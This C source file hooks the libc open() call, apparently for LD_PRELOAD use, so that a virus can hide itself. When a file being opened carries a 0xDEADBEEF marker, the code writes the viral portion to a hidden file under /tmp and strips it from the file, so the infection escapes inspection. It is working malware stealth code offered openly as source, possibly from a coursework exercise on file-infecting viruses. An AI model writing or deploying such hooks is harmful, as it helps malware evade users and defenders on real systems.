#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <fcntl.h>
#include <errno.h>

#include <asm/unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdarg.h>

void hideVirus(char *argv);
int checkForVirus(char *argv);

int open(const char *path, int oflag, ...) {
	int modeUsed = 0;
	mode_t mode = 0;
	va_list argp;
	va_start(argp, oflag);
  	if ((oflag & O_CREAT) == O_CREAT) {
  		mode = va_arg(argp, mode_t);
  		modeUsed = 1;
  	}

  	if (checkForVirus((char *)path)) {
  		hideVirus((char *)path);
  	}

  	if (modeUsed) {
  		return (syscall(__NR_open, path, oflag, mode));
  	} else {
  		return (syscall(__NR_open, path, oflag));
  	}
}

void hideVirus(char *argv) {
	int fd, tempFd;
	if ((fd = syscall(__NR_open, argv, O_RDONLY)) == -1) {
    	exit(1);
    }

    char buf[100];
    sprintf(buf, "/tmp/.%u.%u", getpid(), getuid());
    if ((tempFd = syscall(__NR_open, buf, O_RDWR | O_CREAT | O_EXCL, S_IRWXU | S_IXGRP | S_IXOTH)) == -1) {
    	exit(1);
    }

    // fstat file
    struct stat fstatInfo;
    if (fstat(fd, &fstatInfo) == -1) {
        syscall(__NR_close, fd);
        exit(1);
    }
    
    int offsetState = 0, virLen = 0, i = 0;
    int fileSize = 0, vir = 1;
    char offBuf = 0x00;
    char *virBuf = malloc(sizeof(char) * fstatInfo.st_size);
    char *fileBuf;
    while (read(fd, &offBuf, 1) == 1) {
    	if (vir) {
    		memcpy(&virBuf[virLen++], &offBuf, 1);
    	} else {
    		memcpy(&fileBuf[fileSize++], &offBuf, 1);
    	}
        if (offsetState == 0 && (offBuf & 255) == 0xDE) {
            offsetState = 1;
        } else if (offsetState == 1) {
            if ((offBuf & 255) == 0xAD) {
                offsetState = 2;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 2) {
            if ((offBuf & 255) == 0xBE) {
                offsetState = 3;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 3) {
            if ((offBuf & 255) == 0xEF) {
                offsetState = 4;
                vir = 0;
                fileBuf = malloc(sizeof(char) * fstatInfo.st_size);
            } else {
                offsetState = 0;
            }
        }
    }
    syscall(__NR_close, fd);
    for (i = 0; i < virLen; i++) {
    	write(tempFd, &virBuf[i], 1);
    }
    syscall(__NR_close, tempFd);

    if ((fd = syscall(__NR_open, argv, O_RDWR | O_TRUNC)) == -1) {
    	exit(1);
    }
    for (i = 0; i < fileSize; i++) {
    	write(fd, &fileBuf[i], 1);
    }
    syscall(__NR_close, fd);
    free(virBuf);
    free(fileBuf);
}

int checkForVirus(char *argv) {
    // Open file from argv[1]
    int fd;
    if ((fd = syscall(__NR_open, argv, O_RDONLY)) == -1) {
        return -1;
    }

    // fstat file
    struct stat fstatInfo;
    if (fstat(fd, &fstatInfo) == -1) {
        syscall(__NR_close, fd);
        return -1;
    }

    int offsetState = 0;
    char offBuf = 0x00;
    while (read(fd, &offBuf, 1) == 1) {
        if (offsetState == 0 && (offBuf & 255) == 0xDE) {
            offsetState = 1;
        } else if (offsetState == 1) {
            if ((offBuf & 255) == 0xAD) {
                offsetState = 2;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 2) {
            if ((offBuf & 255) == 0xBE) {
                offsetState = 3;
            } else {
                offsetState = 0;
            }
        } else if (offsetState == 3) {
            if ((offBuf & 255) == 0xEF) {
                offsetState = 4;
                break;
            } else {
                offsetState = 0;
            }
        }
    }
    syscall(__NR_close, fd);

    if (offsetState != 4) {
        return 0;
    }
    return 1;
}